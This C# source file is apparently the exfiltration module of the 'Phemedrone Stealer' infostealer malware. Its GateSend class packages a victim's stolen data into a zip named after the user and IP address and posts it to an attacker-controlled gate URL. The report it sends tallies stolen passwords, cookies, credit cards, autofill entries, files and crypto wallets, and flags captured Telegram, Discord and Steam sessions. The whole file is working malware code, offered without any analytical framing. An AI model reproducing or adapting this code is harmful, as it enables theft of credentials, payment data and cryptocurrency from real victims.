using System;
using System.IO;
using System.Net;
using System.Threading;
using Phemedrone.Extensions;
using Phemedrone.Services;

namespace Phemedrone
{
    public class GateSend
    {
        public static void Send(byte[] content)
        {
            var jsonParser = new JsonParser();
            var fileName =
                $"{Environment.UserName}-[{jsonParser.ParseString("ip", Information.JsonString)}]-Phemedrone-Report.zip";
            var fileDescription = $@"Phemedrone Stealer Report | by @reyvortex & @TheDyer

{"• IP: "}{jsonParser.ParseString("ip", Information.JsonString)}
{"• Country: "}{jsonParser.ParseString("country", Information.JsonString)}
{"• Credentials: "}{ServiceCounter.PasswordList.Count} 🔑| {ServiceCounter.CookieCount} 🍪| {ServiceCounter.CreditCardCount} 💳| {ServiceCounter.AutoFillCount} 📝| {ServiceCounter.FilesCount} 📁
{"• Crypto Wallets: "}{ServiceCounter.WalletsCount} 💰

{"• Telegram: "}{(ServiceCounter.HasTg ? "✅" : "❌")}
{"• Discord: "}{(ServiceCounter.DiscordList.Count > 0 ? "✅" : "❌")}
{"• Steam: "}{(ServiceCounter.HasSteam ? "✅" : "❌")}

https://github.com/REvorker1/Phemedrone-Stealer";

            var request = (HttpWebRequest) WebRequest.Create(Config.GateURl);
            request.Method = "POST";
            var boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
            request.ContentType = "multipart/form-data; boundary=" + boundary;
            var cts = new CancellationTokenSource();
            cts.CancelAfter(TimeSpan.FromSeconds(30));
            using (var formDataStream = new MemoryStream())
            {
                var formDataWriter = new StreamWriter(formDataStream);
                formDataWriter.WriteLine("--" + boundary);
                formDataWriter.WriteLine("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName +
                                         "\"");
                formDataWriter.WriteLine("Content-Type: application/octet-stream");
                formDataWriter.WriteLine();
                formDataWriter.Flush();

                using (var fileStream = new MemoryStream(content))
                {
                    fileStream.CopyTo(formDataStream);
                    fileStream.Close();
                }

                formDataWriter.WriteLine();
                formDataWriter.WriteLine("--" + boundary);
                formDataWriter.WriteLine("Content-Disposition: form-data; name=\"filename\"");
                formDataWriter.WriteLine();
                formDataWriter.WriteLine(fileName);
                formDataWriter.WriteLine("--" + boundary);
                formDataWriter.WriteLine("Content-Disposition: form-data; name=\"filedescription\"");
                formDataWriter.WriteLine();
                formDataWriter.WriteLine(fileDescription);
                formDataWriter.WriteLine("--" + boundary + "--");
                formDataWriter.Flush();
                request.ContentLength = formDataStream.Length;
                formDataStream.Position = 0;
                using (var requestStream = request.GetRequestStream())
                {
                    formDataStream.CopyTo(requestStream);
                    requestStream.Close();
                }
            }
            request.GetResponse();
        }
    }
}